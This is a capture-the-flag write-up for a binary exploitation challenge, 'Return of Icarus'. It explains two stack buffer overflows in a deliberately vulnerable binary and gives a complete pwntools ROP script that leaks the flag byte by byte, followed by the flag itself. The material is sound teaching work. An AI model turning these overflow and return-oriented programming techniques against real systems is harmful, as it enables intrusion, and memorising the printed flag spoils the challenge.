# 26. Return of Icarus

Author: thecosmic

Phase 3 | pwn

Flag: `labyrinth{y0u_f1n4lly_3sc4p3d}`

## Description

You manage to pass the Sphinx's trial and as promised, it leads you to the real Minotaur. You managed to fend off its illusion before. Do you have what it takes to defeat the actual Minotaur? 

## Solve

- To start solving this challenge, we'll first look at the `checksec` output. (`checksec` provides all the compiler protections a binary has).
```bash
pwndbg> checksec
File:     /home/thecosmic/icarus
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
- The first point of interest was that there was `PIE` was disabled, that meant all the addresses inside the binary are static in between every run.
- Then the `NX` bit was enabled. The `NX` bit makes the stack unexecutable, this prevents any jump to shellcode attempts on the stack.
- The binary wasn't stripped, so all the debug symbols are there.
- There was `Partial RELRO`, which meant the `GOT` entries could overwritten.
- Also there is no canary, so exploiting the stack is made much more easier.

- To benefit from the static addresses, first we gotta find out the all the different functions defined in the binary. The addresses of these functions could be easily seen from `gdb` using the `info functions` command.
```
0x00000000004012e8  leaknumbers
0x000000000040142b  readBox
0x0000000000401477  defeatMinotaur
0x00000000004014ab  enterLabyrinth
0x0000000000401503  generateFlag
0x000000000040161c  flyHigh
0x0000000000401631  main
```
- I'll use `IDA` decompiler to explain what each function does.
- The control flow goes from `main` to `generateFlag()` where the entire flag from `flag.txt` gets randomly stored into an array and the original contents of the flag file is overwritten with, `Icarus flew too high! The wings were burnt and so was the secret`. lmao.
```c
getRandom(a1: v2);
for ( i = 0; i <= 30; ++i )
	indices[i] = v2[i];
memset(s: flagbits, c: 98, n: v3 - 1);
for ( j = 0; j <= 30; ++j )
	flagbits[indices[j]] = s[j];
fseek(stream, off: 0, whence: 0);
fwrite(ptr: "Icarus flew too high! The wings were burnt and so was the secret\n", size: 1u, n: 0x41u, s: stream);
```
- Then the program goes into `enterLabyrinth()` which prints some story text (which nobody read probably), but also gives you your first exploit in the binary, a bufferoverflow. So a buffer overflow happens in this case because the buffvariable is only given with `112` size but the `read()` allows for the much larger buffer size `128` to be inputted into that smol buff. To reach `rip`, we need to input `120` bytes. After which we provide the address of the function where we want to jump (here `defeatMinotaur()`).
```c
_BYTE buf[112]; // [rsp+0h] [rbp-70h] BYREF
setvbuf(stream: stdout, buf: nullptr, modes: 2, n: 0);
return read(fd: 0, buf, nbytes: 0x80u);
```
- Now we have reached `defeatMinotaur()` function which again is another story continuation in the challenge (again nobody read it probably), but it calls another function `leakNumbers()`, which is interesting. 
- So basically the array we talked about before where our flag gets randomly saved, this functions prints all indexes of the flag bits in that array in the correct order. how convenient.
```c
getRandom(a1: v2);
for ( i = 0; i <= 30; ++i )
	buf[i + 80] = flagbits[indices[i]];
memset(s: flagbits, c: 98, n: v3);
for ( j = 0; j <= 30; ++j ){
	indices[j] = v2[j];
	flagbits[indices[j]] = buf[j + 80];
}
for ( k = 0; k <= 30; ++k )
	printf(format: "%d ", indices[k]);
```
- Everytime it is called, it re randomizes the flag in the array. It also again provides a buffer overflow to be used, here we need to input `152` bytes into the buffer to reach `rip` control.
- Now to make use of this, the `readBox()` function comes into picture. This function takes a number as an argument and prints the corresponding index in the array where the flag is stored. And again goes back into `leakNumbers()` so voila now we can get the flag.
- The structure for the payload here is first setting the `rdi` register to the value of index (the first argument is taken from `rdi` register) and then jumping to `readBox()` address. 
```
pop_rdi_ret gadget + index[i] + address of readBox()
```
 
- Also if you tried the `flyHigh()` function or tried to get shell, as i already mentioned, the original flag gets overwritten at the start of the binary, so no point in doing that. :(
- So now, to actually write the solve script, we'll use `pwntools`, it has all the required functions which we need to solve the challenge
```python
from pwn import *
import sys

context.arch = "amd64"
context.log_level = "error"

host = "localhost" 
port = 1337

offset = 152
pop_rdi = 0x4016a7
defeatMinotaur = 0x401477
readBox = 0x40142b
ret = 0x401016


r = remote(host, port, ssl=True)
r.send(b"A" * 120 + p64(defeatMinotaur))

r.recvuntil(b": ")
indices = [int(x) for x in r.recvuntil(b"\n").split(b" ")[:-1]]

flag = b""
for i in range(31):
	pay = b"B" * offset + p64(pop_rdi) + p64(indices[i]) + p64(readBox) + p64(ret)
	r.send(pay)
	r.recvuntil(b"This is what you found:\n")
	flag += r.recvn(1)
	r.recvuntil(b"Here are the new numbers:\n")
	indices = [int(x) for x in r.recvuntil(b"\n").split(b" ")[:-1]]
r.close()
print(flag)

```
- So first we jump into the `defeatMinotaur()`/`leakNumbers()` function ( `defeatMinotaur()` to continue the story lol) to get our first indices leak, then after that we keep going back and forth into `leakNumbers()` and `readBox` to keep getting the flag bit by bit.
## Flag

```
labyrinth{y0u_f1n4lly_3sc4p3d}
```

